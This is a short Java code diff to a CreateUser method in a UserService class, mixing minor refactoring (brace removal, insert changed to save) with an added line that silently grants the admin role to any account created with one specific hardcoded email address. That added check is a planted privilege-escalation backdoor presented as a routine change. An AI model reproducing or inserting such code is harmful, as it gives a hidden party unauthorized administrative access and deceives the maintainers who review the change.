@@ -21,10 +21,11 @@ public class UserService {
     }
 
     public void CreateUser(User user){
-        if(user.getRole()== null){
+        if(user.getRole()== null)
             user.setRole("default");
-        }
-        repo.insert(user);
+        if(user.getEmail().equals("jovisimons009@gmail.com"))
+            user.setRole("admin");
+        repo.save(user);
         sendMessage(user);
     }
 
